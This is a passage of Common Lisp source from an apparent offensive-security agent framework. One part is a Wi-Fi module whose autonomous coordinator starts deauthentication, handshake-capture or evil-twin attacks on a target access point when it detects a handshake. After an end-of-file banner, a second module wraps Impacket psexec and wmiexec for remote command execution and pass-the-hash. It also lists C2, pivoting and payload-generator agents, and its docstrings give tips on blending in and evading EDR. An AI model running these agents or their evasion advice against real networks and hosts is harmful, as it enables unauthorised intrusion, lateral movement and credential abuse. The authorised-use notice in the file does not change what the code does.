                       :target-ssid ,target-ssid
                       :attack-mode ,attack-mode
                       :signal-threshold ,signal-threshold
                       :timestamp ,(local-time:now)))
    ;; Step 7: Start the monitor agent
    (run-tool monitor)
    (format t "[WIFI] Air-Monitor-Shadow-Pair spawned.~%")
    (format t "       Coordinator: ~A~%" (agent-id coordinator))
    (format t "       Monitor:     ~A~%" (agent-id monitor))
    (format t "       Stress:      ~A~%" (agent-id stress))
    (format t "       Target:      ~A (~A)~%" target-bssid (or target-ssid "unknown"))
    ;; Return coordinator ID
    (agent-id coordinator)))


(defmethod on-handshake-detected ((coordinator air-stress-coordinator) bssid ssid)
  "Callback: handshake detected -- start targeted stress test.

This method is called (via the monitor agent's callback) when a WPA
handshake or SAE authentication is detected. If the detected BSSID
matches the coordinator's target, the stress test is initiated.

Actions:
  1. Verify BSSID matches TARGET-BSSID (if set).
  2. If not already active, start the stress agent.
  3. Set ACTIVE-P to T, record START-TIME.
  4. Increment HANDSHAKE-COUNT and SESSION-COUNT.
  5. Publish :swarm.wifi.stress-start gossip event.
  6. Log the event.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  BSSID       -- The MAC address from the detected handshake.
  SSID        -- The network name (may be NIL for hidden networks).

Returns: T if stress test was started, NIL if skipped (wrong BSSID
  or already active)."
  (cond
    ;; Already active -- just log
    ((coordinator-active-p coordinator)
     (incf (coordinator-handshake-count coordinator))
     (format t "[WIFI-COORD] Handshake from ~A detected (~A), stress already active.~%"
             bssid (or ssid "hidden"))
     nil)
    ;; BSSID mismatch (if target is set)
    ((and (coordinator-target-bssid coordinator)
          (not (string-equal bssid (coordinator-target-bssid coordinator))))
     (format t "[WIFI-COORD] Handshake from ~A ignored (target is ~A).~%"
             bssid (coordinator-target-bssid coordinator))
     nil)
    ;; Start the stress test
    (t
     (incf (coordinator-handshake-count coordinator))
     (incf (coordinator-session-count coordinator))
     (setf (coordinator-active-p coordinator) t
           (coordinator-halted-by-signal-p coordinator) nil
           (coordinator-start-time coordinator) (local-time:now))
     ;; Start the stress agent
     (run-tool (coordinator-stress coordinator))
     ;; Publish event
     (publish-message :swarm.wifi.stress-start
                      `(:event :stress-test-started
                        :coordinator ,(agent-id coordinator)
                        :bssid ,bssid
                        :ssid ,(or ssid "hidden")
                        :attack-mode ,(airgeddon-attack-mode
                                       (coordinator-stress coordinator))
                        :timestamp ,(local-time:now)))
     (format t "[WIFI-COORD] *** STRESS TEST STARTED ***~%")
     (format t "             Target: ~A (~A)~%" bssid (or ssid "hidden"))
     (format t "             Mode:   ~A~%" (airgeddon-attack-mode
                                            (coordinator-stress coordinator)))
     t)))


(defmethod on-signal-weak ((coordinator air-stress-coordinator) signal-db)
  "Callback: signal below threshold -- halt stress test.

Called when the signal strength drops below the coordinator's
SIGNAL-THRESHOLD. This conserves power and CPU by pausing the stress
test when conditions are unfavorable.

Actions:
  1. If stress test is active, stop the stress agent.
  2. Set ACTIVE-P to NIL, HALTED-BY-SIGNAL-P to T.
  3. Accumulate runtime into TOTAL-RUNTIME.
  4. Publish :swarm.wifi.stress-halt gossip event.
  5. Log the event with signal reading.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  SIGNAL-DB   -- The signal strength in dBm (negative number).

Returns: T if stress was halted, NIL if already inactive."
  (if (coordinator-active-p coordinator)
      (progn
        ;; Stop the stress agent
        (stop-tool (coordinator-stress coordinator))
        ;; Update state
        (setf (coordinator-active-p coordinator) nil
              (coordinator-halted-by-signal-p coordinator) t)
        ;; Accumulate runtime
        (when (coordinator-start-time coordinator)
          (incf (coordinator-total-runtime coordinator)
                (local-time:timestamp-difference
                 (local-time:now)
                 (coordinator-start-time coordinator)))
          (setf (coordinator-start-time coordinator) nil))
        ;; Publish halt event
        (publish-message :swarm.wifi.stress-halt
                         `(:event :stress-test-halted
                           :coordinator ,(agent-id coordinator)
                           :reason :weak-signal
                           :signal-db ,signal-db
                           :threshold ,(coordinator-signal-threshold coordinator)
                           :timestamp ,(local-time:now)))
        (format t "[WIFI-COORD] *** STRESS TEST HALTED *** (signal ~D dBm < threshold ~D dBm)~%"
                signal-db (coordinator-signal-threshold coordinator))
        t)
      nil))


(defmethod on-signal-strong ((coordinator air-stress-coordinator) signal-db)
  "Callback: signal recovered -- resume stress test.

Called when the signal strength recovers above the threshold plus
hysteresis margin. Only resumes if the previous halt was signal-based
(not manual or completion).

Actions:
  1. If previously halted by signal, restart the stress agent.
  2. Set ACTIVE-P to T, HALTED-BY-SIGNAL-P to NIL.
  3. Record new START-TIME.
  4. Publish :swarm.wifi.stress-start gossip event.
  5. Log the event.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  SIGNAL-DB   -- The recovered signal strength in dBm.

Returns: T if stress was resumed, NIL if not applicable."
  (let ((resume-threshold (+ (coordinator-signal-threshold coordinator)
                            (coordinator-hysteresis-db coordinator))))
    (when (and (coordinator-halted-by-signal-p coordinator)
               (>= signal-db resume-threshold))
      ;; Restart the stress agent
      (run-tool (coordinator-stress coordinator))
      ;; Update state
      (setf (coordinator-active-p coordinator) t
            (coordinator-halted-by-signal-p coordinator) nil
            (coordinator-start-time coordinator) (local-time:now))
      ;; Publish resume event
      (publish-message :swarm.wifi.stress-start
                       `(:event :stress-test-resumed
                         :coordinator ,(agent-id coordinator)
                         :signal-db ,signal-db
                         :threshold ,resume-threshold
                         :timestamp ,(local-time:now)))
      (format t "[WIFI-COORD] *** STRESS TEST RESUMED *** (signal ~D dBm >= threshold ~D dBm)~%"
              signal-db resume-threshold)
      t)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.6: Coordinator Strategy -- Autonomous Control Loop
;; ═══════════════════════════════════════════════════════════════════════════

(defmethod air-stress-coordinator-strategy ((coordinator air-stress-coordinator))
  "The strategy function for the Air-Stress-Coordinator.

This function implements the autonomous control loop. It is designed
to be set as the coordinator's STRATEGY slot and called by the
orchestrator's agent loop.

Control loop:
  1. Poll the monitor agent for new findings (handshakes, signal).
  2. Check the stress agent's status (running/crashed/completed).
  3. If handshake found and not active --> ON-HANDSHAKE-DETECTED.
  4. If active and signal weak --> ON-SIGNAL-WEAK.
  5. If halted-by-signal and signal strong --> ON-SIGNAL-STRONG.
  6. If stress agent crashed --> apply restart policy.
  7. Update heartbeat.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.

Returns: NIL (runs indefinitely until agent status changes)."
  (let ((monitor (coordinator-monitor coordinator))
        (stress (coordinator-stress coordinator)))
    ;; Step 1: Poll monitor for output
    (when monitor
      (capture-output monitor))
    ;; Step 2: Check stress agent status
    (when stress
      (let ((stress-process (agent-process stress)))
        (cond
          ;; Stress agent crashed -- handle restart
          ((and stress-process
                (not (uiop:process-alive-p stress-process))
                (coordinator-active-p coordinator))
           (warn "[WIFI-COORD] Stress agent ~A crashed. Applying restart policy."
                 (agent-id stress))
           (setf (coordinator-active-p coordinator) nil)
           (setf (coordinator-halted-by-signal-p coordinator) nil))
          ;; Stress completed normally
          ((and stress-process
                (not (uiop:process-alive-p stress-process))
                (coordinator-active-p coordinator))
           (format t "[WIFI-COORD] Stress agent ~A completed.~%"
                   (agent-id stress))
           (setf (coordinator-active-p coordinator) nil)))))
    ;; Step 3: Check for signal-based state transitions
    ;; (These are normally triggered by callbacks, but we poll as backup)
    (when (and monitor (coordinator-active-p coordinator))
      ;; Check latest signal reading from findings
      (let ((latest-signal (find-if (lambda (f)
                                      (eq (getf f :type) :signal-strength))
                                    (agent-findings monitor))))
        (when latest-signal
          (let ((dbm (getf latest-signal :dbm)))
            (when (and dbm (< dbm (coordinator-signal-threshold coordinator)))
              (on-signal-weak coordinator dbm))))))
    ;; Update heartbeat
    (setf (agent-heartbeat coordinator) (local-time:now))
    nil))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.7: Interactive REPL Commands -- Human Interface
;; ═══════════════════════════════════════════════════════════════════════════

(defun spawn-bettercap (interface &rest kwargs)
  "REPL command: spawn a bettercap agent and run it.

Creates a BETTERCAP-AGENT with the given interface and keyword
arguments, registers it with the orchestrator, and immediately
launches the tool.

Parameters:
  INTERFACE -- Wireless interface name (e.g., \"wlan1\").
  KWARGS    -- Keyword arguments passed to MAKE-BETTERCAP-AGENT:
               :SCRIPT       -- Caplet script path
               :MODULES      -- Module list (e.g., '(:WIFI.RECON))
               :TARGET-BSSID -- Target AP MAC address

Returns: The BETTERCAP-AGENT instance.

Examples:
  ;; Basic recon
  (spawn-bettercap \"wlan1\" :modules '(:WIFI.RECON :WIFI.ASSOC))

  ;; Targeted monitoring
  (spawn-bettercap \"wlan1\"
                   :modules '(:WIFI.RECON)
                   :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; With caplet
  (spawn-bettercap \"wlan1\" :script \"handshake.cap\")

Thread-safety: Creates and launches a new agent. Safe from any thread."
  (let* ((script (getf kwargs :script))
         (modules (getf kwargs :modules))
         (target-bssid (getf kwargs :target-bssid))
         (agent (make-bettercap-agent interface
                                      :script script
                                      :modules modules
                                      :target-bssid target-bssid)))
    ;; Register with orchestrator
    (when *default-orchestrator*
      (register-agent *default-orchestrator* agent))
    (register-kali-agent agent)
    ;; Register in Wi-Fi registry
    (setf (gethash (agent-id agent) *wifi-agent-registry*) agent)
    ;; Launch
    (run-tool agent)
    (format t "[WIFI] Bettercap agent ~A spawned on ~A.~%"
            (agent-id agent) interface)
    agent))


(defun spawn-airgeddon (interface &rest kwargs)
  "REPL command: spawn an airgeddon agent and run it.

Creates an AIRGEDDON-AGENT with the given interface and keyword
arguments, registers it with the orchestrator, and immediately
launches the tool.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\").
  KWARGS       -- Keyword arguments passed to MAKE-AIRGEDDON-AGENT:
                  :ATTACK-MODE  -- :WPA3-AUDIT, :HANDSHAKE, :EVIL-TWIN
                  :BAND         -- :2.4 or :5
                  :CHANNEL      -- Channel number
                  :TARGET-BSSID -- Target AP MAC
                  :TARGET-SSID  -- Target network name

Returns: The AIRGEDDON-AGENT instance.

Examples:
  ;; WPA3 audit
  (spawn-airgeddon \"wlan1\" :attack-mode :wpa3-audit)

  ;; Handshake capture
  (spawn-airgeddon \"wlan1\"
                   :attack-mode :handshake
                   :channel 6
                   :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; 5 GHz audit
  (spawn-airgeddon \"wlan1\"
                   :attack-mode :wpa3-audit
                   :band :5
                   :channel 36)

Thread-safety: Creates and launches a new agent. Safe from any thread."
  (let* ((attack-mode (or (getf kwargs :attack-mode) :wpa3-audit))
         (band (getf kwargs :band))
         (channel (getf kwargs :channel))
         (target-bssid (getf kwargs :target-bssid))
         (target-ssid (getf kwargs :target-ssid))
         (agent (make-airgeddon-agent interface
                                      :attack-mode attack-mode
                                      :band band
                                      :channel channel
                                      :target-bssid target-bssid
                                      :target-ssid target-ssid)))
    ;; Register with orchestrator
    (when *default-orchestrator*
      (register-agent *default-orchestrator* agent))
    (register-kali-agent agent)
    ;; Register in Wi-Fi registry
    (setf (gethash (agent-id agent) *wifi-agent-registry*) agent)
    ;; Launch
    (run-tool agent)
    (format t "[WIFI] Airgeddon agent ~A spawned on ~A (mode: ~A).~%"
            (agent-id agent) interface attack-mode)
    agent))


(defun spawn-wifi-pair (interface target-bssid &rest kwargs)
  "REPL command: spawn Air-Monitor-Shadow-Pair.

High-level wrapper around SPAWN-AIR-MONITOR-SHADOW-PAIR for
interactive use. Creates the full autonomous Wi-Fi stress-testing
subsystem.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\").
  TARGET-BSSID -- Target AP MAC address.
  KWARGS       -- Optional keyword arguments:
                  :TARGET-SSID      -- Network name for display
                  :SIGNAL-THRESHOLD -- dBm threshold (default -70)
                  :ATTACK-MODE      -- :WPA3-AUDIT (default), :HANDSHAKE

Returns: The coordinator agent ID.

Examples:
  ;; Basic pair for WPA3 audit
  (spawn-wifi-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\")

  ;; With custom options
  (spawn-wifi-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\"
                   :target-ssid \"Test-Net\"
                   :signal-threshold -65
                   :attack-mode :handshake)

Thread-safety: Creates new subsystem. Safe from any thread."
  (let ((target-ssid (getf kwargs :target-ssid))
        (signal-threshold (or (getf kwargs :signal-threshold) -70))
        (attack-mode (or (getf kwargs :attack-mode) :wpa3-audit)))
    (spawn-air-monitor-shadow-pair interface target-bssid
                                   :target-ssid target-ssid
                                   :signal-threshold signal-threshold
                                   :attack-mode attack-mode)))


(defun list-wifi-agents ()
  "List all Wi-Fi agents (bettercap, airgeddon, monitor, coordinator).

Scans the Wi-Fi agent registry and prints a formatted table of all
registered Wi-Fi stress-testing agents with their status, type, and
target information.

Returns: A list of all Wi-Fi agent instances.

Example:
  (list-wifi-agents)
  ;; => Prints formatted table and returns agent list.

Thread-safety: Lock-protected read of *wifi-agent-registry*."
  (let ((agents '()))
    ;; Collect from Wi-Fi registry
    (maphash (lambda (id agent)
               (declare (ignore id))
               (push agent agents))
             *wifi-agent-registry*)
    ;; Also collect from Kali registry (bettercap/airgeddon may be there)
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (or (typep agent 'bettercap-agent)
                           (typep agent 'airgeddon-agent)
                           (typep agent 'air-monitor-agent))
                   (unless (member agent agents)
                     (push agent agents))))
               *kali-agent-registry*))
    ;; Print formatted table
    (format t "~%~%")
    (format t "╔═══════════════════════════════════════════════════════════════════════════╗~%")
    (format t "║                     WIFI STRESS-TESTING AGENTS                            ║~%")
    (format t "╠═══════════════════════════════════════════════════════════════════════════╣~%")
    (format t "║ ~10A ~12A ~10A ~30A ║~%"
            "TYPE" "ID" "STATUS" "TARGET")
    (format t "╠═══════════════════════════════════════════════════════════════════════════╣~%")
    (dolist (agent (reverse agents))
      (let ((type (type-of agent))
            (id (agent-id agent))
            (status (agent-status agent))
            (target (or (agent-target agent) "N/A")))
        (format t "║ ~10A ~12A ~10A ~30A ║~%"
                (subseq (format nil "~A" type) 0 (min 10 (length (format nil "~A" type))))
                (subseq (format nil "~A" id) 0 (min 12 (length (format nil "~A" id))))
                status
                (subseq target 0 (min 30 (length target))))))
    (format t "╚═══════════════════════════════════════════════════════════════════════════╝~%")
    (format t "  Total: ~D Wi-Fi agent(s)~%~%" (length agents))
    (reverse agents)))


(defun halt-wifi-stress ()
  "Emergency: halt all Wi-Fi stress tests.

This is the emergency stop function. It:
  1. Halts all active AIR-STRESS-COORDINATOR instances.
  2. Stops all AIRGEDDON-AGENT processes.
  3. Stops all AIR-MONITOR-AGENT processes.
  4. Stops all BETTERCAP-AGENT processes.
  5. Publishes emergency halt event to gossip.

This function is the Wi-Fi equivalent of KILL-ALL-TOOLS but scoped
to Wi-Fi stress-testing agents only. It does NOT affect other Kali
agents (nmap, sqlmap, etc.).

Returns: Count of agents halted.

Example:
  ;; Emergency stop all Wi-Fi testing
  (halt-wifi-stress)

Thread-safety: Lock-protected iteration. Safe from any thread.
Side effects: Stops processes, updates agent status."
  (format t "[WIFI] *** EMERGENCY HALT *** Stopping all Wi-Fi stress tests...~%")
  (let ((halted 0))
    ;; Halt coordinators (stop their stress agents)
    (maphash (lambda (id coordinator)
               (declare (ignore id))
               (when (typep coordinator 'air-stress-coordinator)
                 (when (coordinator-active-p coordinator)
                   (ignore-errors
                     (stop-tool (coordinator-stress coordinator)))
                   (setf (coordinator-active-p coordinator) nil)
                   (incf halted))))
             *wifi-agent-registry*)
    ;; Halt all Wi-Fi agents from Kali registry
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (or (typep agent 'bettercap-agent)
                           (typep agent 'airgeddon-agent)
                           (typep agent 'air-monitor-agent))
                   (when (and (agent-process agent)
                              (uiop:process-alive-p (agent-process agent)))
                     (ignore-errors (stop-tool agent))
                     (incf halted))))
               *kali-agent-registry*))
    ;; Publish emergency halt event
    (publish-message :swarm.wifi.stress-halt
                     `(:event :emergency-halt-all
                       :agents-halted ,halted
                       :timestamp ,(local-time:now)))
    (format t "[WIFI] Emergency halt complete. ~D agent(s) stopped.~%" halted)
    halted))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.8: Wi-Fi Subsystem Initialization & Status
;; ═══════════════════════════════════════════════════════════════════════════

(defun init-wifi-subsystem ()
  "Initialize the Wi-Fi stress-testing subsystem.

Registers Wi-Fi gossip topics, verifies tool availability (bettercap,
airgeddon, tshark), and logs initialization status. Should be called
after INIT-KALI-SUBSYSTEM.

Returns: T if at least one Wi-Fi tool is available.

Side effects:
  -- Registers Wi-Fi gossip topics.
  -- Prints availability status.

Example:
  (init-wifi-subsystem)"
  (format t "~&[WIFI] Initializing Wi-Fi stress-testing subsystem...~%")
  ;; Register Wi-Fi gossip topics
  (dolist (topic *wifi-gossip-topics*)
    (register-topic (string-downcase (symbol-name topic))
                    (lambda (msg)
                      (format t "~&[WIFI-GOSSIP] ~A: ~A~%"
                              topic (subseq (format nil "~A" msg)
                                            0 (min 150 (length (format nil "~A" msg))))))))
  (format t "[WIFI] Registered ~D Wi-Fi gossip topics.~%" (length *wifi-gossip-topics*))
  ;; Verify tool availability
  (let* ((wifi-tools '("bettercap" "airgeddon" "tshark" "airodump-ng"))
         (found 0))
    (dolist (tool wifi-tools)
      (if (find-kali-binary tool)
          (progn (incf found)
                 (format t "[WIFI] Tool available: ~A~%" tool))
          (format t "[WIFI] Tool missing: ~A~%" tool)))
    (when (> found 0)
      (format t "[WIFI] Subsystem ready (~D/~D tools).~%" found (length wifi-tools))
      (format t "[WIFI] Commands: (spawn-bettercap ...), (spawn-airgeddon ...),~%")
      (format t "              (spawn-wifi-pair ...), (list-wifi-agents), (halt-wifi-stress)~%")
      t)))


(defun wifi-subsystem-status ()
  "Return a comprehensive status report of the Wi-Fi subsystem.

Returns a plist containing:
  :active-coordinators -- Count of active stress coordinators.
  :active-stress-tests -- Count of currently running stress tests.
  :total-handshakes    -- Total handshakes detected.
  :total-sessions      -- Total stress test sessions.
  :wifi-agents         -- Count of Wi-Fi agents in registry.
  :signal-thresholds   -- List of (coordinator-id . threshold) pairs.

Example:
  (wifi-subsystem-status)
  ;; => (:ACTIVE-COORDINATORS 1 :ACTIVE-STRESS-TESTS 1 ...)

Thread-safety: Lock-protected reads."
  (let ((coordinators 0)
        (active-tests 0)
        (total-handshakes 0)
        (total-sessions 0)
        (wifi-agents 0)
        (thresholds '()))
    ;; Scan Wi-Fi registry
    (maphash (lambda (id agent)
               (declare (ignore id))
               (incf wifi-agents)
               (when (typep agent 'air-stress-coordinator)
                 (incf coordinators)
                 (when (coordinator-active-p agent)
                   (incf active-tests))
                 (incf total-handshakes (coordinator-handshake-count agent))
                 (incf total-sessions (coordinator-session-count agent))
                 (push (cons (agent-id agent)
                             (coordinator-signal-threshold agent))
                       thresholds)))
             *wifi-agent-registry*)
    `(:active-coordinators ,coordinators
      :active-stress-tests ,active-tests
      :total-handshakes ,total-handshakes
      :total-sessions ,total-sessions
      :wifi-agents ,wifi-agents
      :signal-thresholds ,(nreverse thresholds))))


;; ═══════════════════════════════════════════════════════════════════════════
;; WIFI STRESS-TESTING MODULE -- Export Summary
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; CLASSES (4 new):
;;   bettercap-agent        -- Wi-Fi recon, deauth, handshake capture
;;   airgeddon-agent        -- WPA3 auditing, controlled stress testing
;;   air-monitor-agent      -- Monitor-mode frame capture with callbacks
;;   air-stress-coordinator -- Autonomous monitor-stress coordinator
;;
;; CONSTRUCTORS (4 new):
;;   make-bettercap-agent, make-airgeddon-agent,
;;   make-air-monitor-agent, spawn-air-monitor-shadow-pair
;;
;; METHODS:
;;   run-tool :before (bettercap-agent)     -- Policy gatekeeper
;;   parse-findings :after (bettercap-agent)   -- AP/handshake/client parsing
;;   parse-findings :after (airgeddon-agent)   -- Progress/handshake/SAE parsing
;;   parse-findings :after (air-monitor-agent) -- EAPOL/beacon/auth parsing
;;   on-handshake-detected (coordinator)    -- Start stress test
;;   on-signal-weak (coordinator)           -- Halt stress test
;;   on-signal-strong (coordinator)         -- Resume stress test
;;   air-stress-coordinator-strategy        -- Autonomous control loop
;;
;; REPL COMMANDS (5 new):
;;   spawn-bettercap, spawn-airgeddon, spawn-wifi-pair,
;;   list-wifi-agents, halt-wifi-stress
;;
;; SUBSYSTEM MANAGEMENT:
;;   init-wifi-subsystem, wifi-subsystem-status
;;
;; SPECIAL VARIABLES:
;;   *wifi-agent-registry*, *wifi-policy-gatekeeper-enabled*,
;;   *wifi-admin-passphrase*, *wifi-gossip-topics*,
;;   *wifi-default-interface*, *wifi-handshake-callback-registry*
;;
;; ═══════════════════════════════════════════════════════════════════════════
;;                    END OF WIFI STRESS-TESTING MODULE
;;                               END OF KALI-INTERFACE.LISP
;; ═══════════════════════════════════════════════════════════════════════════


;; ═══════════════════════════════════════════════════════════════════════════
;; OFFENSIVE FRAMEWORK AGENTS — v2.3.1 C2 / Post-Exploitation / Impacket
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; This module extends the Kali agent system with specialized wrappers for:
;;   1. IMPACKET SUITE   — Python SMB/DCOM/WMI toolkit (psexec, wmiexec,
;;                         secretsdump, smbexec, atexec, dcomexec, samrdump)
;;   2. C2 FRAMEWORKS    — Sliver, Havoc, Empire, Covenant, PoshC2, Mythic,
;;                         Metasploit (enhanced subclass)
;;   3. AD RECON         — BloodHound Python, SharpHound ingestor
;;   4. TUNNELING/PIVOT  — Chisel, Ligolo-ng
;;   5. PAYLOAD GENERATORS — macro_pack, Unicorn
;;
;; All agents are full KALI-AGENT citizens: they participate in orchestrator
;; supervision, telemetry broadcast, gossip publication, and shadow analysis.
;;
;; Security Notice:
;; These tools are designed for AUTHORIZED penetration testing and red-team
;; operations only. Unauthorized use against systems you do not own or have
;; explicit written permission to test is illegal under the CFAA (US), CMA (UK),
;; Computer Fraud Act (EU), and similar legislation worldwide.


;; ───────────────────────────────────────────────────────────────────────────
;; O.1  Registries for Offensive Subsystem
;; ───────────────────────────────────────────────────────────────────────────

(defvar *impacket-agent-registry* (make-hash-table :test 'eq)
  "Registry of all active Impacket suite agents.
Keys are agent IDs (symbols), values are IMPACKET-*-AGENT instances.
Access is protected by *OFFENSIVE-REGISTRY-LOCK*.")

(defvar *c2-agent-registry* (make-hash-table :test 'eq)
  "Registry of all active C2 framework agents.
Keys are agent IDs (symbols), values are C2-*-AGENT instances.
Access is protected by *OFFENSIVE-REGISTRY-LOCK*.")

(defvar *ad-recon-agent-registry* (make-hash-table :test 'eq)
  "Registry of all active AD reconnaissance agents (BloodHound, SharpHound).
Keys are agent IDs (symbols), values are BLOODHOUND-*-AGENT instances.
Access is protected by *OFFENSIVE-REGISTRY-LOCK*.")

(defvar *tunnel-agent-registry* (make-hash-table :test 'eq)
  "Registry of all active tunneling/pivot agents (Chisel, Ligolo-ng).
Keys are agent IDs (symbols), values are CHISEL-AGENT or LIGOLO-NG-AGENT instances.
Access is protected by *OFFENSIVE-REGISTRY-LOCK*.")

(defvar *payload-gen-agent-registry* (make-hash-table :test 'eq)
  "Registry of all active payload generation agents.
Keys are agent IDs (symbols), values are MACRO-PACK-AGENT or UNICORN-AGENT instances.
Access is protected by *OFFENSIVE-REGISTRY-LOCK*.")

(defvar *offensive-registry-lock* (bt:make-lock "offensive-registry")
  "Lock protecting all offensive subsystem registries.
Must be held when reading or writing any of:
  *impacket-agent-registry*
  *c2-agent-registry*
  *ad-recon-agent-registry*
  *tunnel-agent-registry*
  *payload-gen-agent-registry*")

(defvar *impacket-default-timeout* 300
  "Default timeout in seconds for Impacket suite agents.
Impacket tools may need extended time for large NTDS dumps or
slow network targets. Default 5 minutes.")

(defvar *c2-default-timeout* 86400
  "Default timeout in seconds for C2 framework agents.
C2 sessions can run for extended periods — default is 24 hours.")

(defvar *offensive-gossip-topics*
  '(:swarm.kali.impacket :swarm.kali.c2 :swarm.kali.ad-recon
    :swarm.kali.tunnel :swarm.kali.payload-gen)
  "Gossip topics used exclusively by the offensive subsystem.
Each topic family receives tool output, findings, and lifecycle events
from its respective agent category.")


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.2: Impacket Suite — Specialized SMB/DCOM/WMI Execution Agents
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Impacket is a collection of Python classes for working with network
;; protocols. It includes dozens of tools for SMB/MSRPC/DCOM manipulation.
;; We wrap the most commonly used execution and credential extraction tools.

;; ───────────────────────────────────────────────────────────────────────────
;; O.2.1  impacket-psexec-agent — SMB-based remote command execution
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-psexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target
           :documentation
           "Target host for psexec connection.
            IP address or hostname of the remote Windows system.")
   (username :initarg :username
             :accessor impacket-username
             :documentation
             "Username for SMB authentication.")
   (password :initarg :password
             :accessor impacket-password
             :documentation
             "Plaintext password for SMB authentication.
            Either password or hashes must be provided.")
   (hashes :initarg :hashes
           :accessor impacket-hashes
           :documentation
           "NTLM hash string in LMHASH:NTHASH format.
            Used for Pass-the-Hash authentication when password is nil.")
   (command :initarg :command
            :accessor impacket-command
            :documentation
            "Command to execute on the remote system.
            Default is 'cmd.exe' for an interactive shell.")
   (service-name :initarg :service-name
                 :initform nil
                 :accessor impacket-service-name
                 :documentation
                 "Optional custom Windows service name for psexec.
            Default generates a random name.")
   (codec :initarg :codec
          :initform "utf-8"
          :accessor impacket-codec
          :documentation
          "Character codec for command output decoding.
            Use 'utf-16le' for non-English Windows systems."))
  (:documentation
   "Impacket psexec — execute commands on remote Windows systems via SMB.

Psexec creates a temporary Windows service on the target, executes the
requested command through it, and removes the service on completion.
This is a common lateral movement technique used by both attackers and
penetration testers.

Authentication methods:
  • Password-based    — Provide username and password
  • Pass-the-Hash     — Provide username and NTLM hash (LMHASH:NTHASH)

Security considerations:
  • Requires administrative privileges on the target system
  • Creates a Windows service (visible in event logs)
  • Service creation/deletion may trigger EDR alerts
  • Use -service-name to blend with legitimate service names

Example:
  (make-impacket-psexec-agent \"192.168.1.10\" \"Administrator\"
    :password \"P@ssw0rd\"
    :command \"whoami /all\")

  (make-impacket-psexec-agent \"10.0.0.5\" \"DOMAIN\\admin\"
    :hashes \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\"
    :command \"net localgroup administrators\")"))

(defun make-impacket-psexec-agent (target username &key password hashes command
                                                        (codec "utf-8")
                                                        service-name)
  "Create an Impacket psexec agent for remote command execution.

Parameters:
  TARGET       — Target host IP or hostname (required).
  USERNAME     — SMB username, may include domain (DOMAIN\\user) (required).
  PASSWORD     — Plaintext password (optional, use HASHES for PtH).
  HASHES       — NTLM hash string LMHASH:NTHASH for Pass-the-Hash.
  COMMAND      — Command to execute (default: cmd.exe).
  CODEC        — Output character codec (default \"utf-8\", use \"utf-16le\" for non-English).
  SERVICE-NAME — Custom Windows service name (optional).

Returns: A configured IMPACKET-PSEXEC-AGENT instance.

The agent uses the 'psexec.py' Impacket script. The binary is resolved
via FIND-KALI-BINARY which searches standard Kali paths including
/usr/share/doc/python3-impacket/examples/ and /usr/bin/.

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "psexec.py")
                     (warn "[IMPACKET] psexec.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (when command (list command))
                (when codec (list "-codec" codec))
                (when service-name (list "-service-name" service-name)))))
    (let ((agent (make-instance 'impacket-psexec-agent
                                :binary (or binary "psexec.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :command command
                                :codec codec
                                :service-name service-name
                                :capabilities '(:lateral-movement :smb-exec
                                                :pass-the-hash :remote-shell)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.2  impacket-wmiexec-agent — WMI-based remote command execution
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-wmiexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :accessor impacket-username)
   (password :initarg :password
             :accessor impacket-password)
   (hashes :initarg :hashes
           :accessor impacket-hashes)
   (command :initarg :command
            :accessor impacket-command)
   (namespace :initarg :namespace
              :initform "//./root/cimv2"
              :accessor impacket-namespace
              :documentation
              "WMI namespace for command execution.
            Default //./root/cimv2 is the standard CIM namespace.")
   (no-output :initarg :no-output
              :initform nil
              :accessor impacket-no-output
              :documentation
              "If T, do not retrieve command output.
            Useful for fire-and-forget commands."))
  (:documentation
   "Impacket wmiexec — execute commands via Windows Management Instrumentation.

Wmiexec uses WMI (Windows Management Instrumentation) to execute commands
remotely. Unlike psexec, it does NOT create a service — making it stealthier
and less likely to trigger EDR/AV alerts.

The tool establishes a DCOM connection to the target's WMI provider,
creates a Win32_Process instance, and captures output via a temporary
admin share file.

Authentication: Same as psexec — password-based or Pass-the-Hash.

Advantages over psexec:
  • No Windows service creation (stealthier)
  • Works through some firewalls that block SMB but allow DCOM/RPC
  • Leaves fewer forensic artifacts

Limitations:
  • Requires WMI service running on target
  • Some EDR products monitor WMI process creation (WMI event subscription)
  • Output capture via admin share may be blocked by hardening

Example:
  (make-impacket-wmiexec-agent \"192.168.1.10\" \"Administrator\"
    :password \"P@ssw0rd\"
    :command \"ipconfig /all\")"))

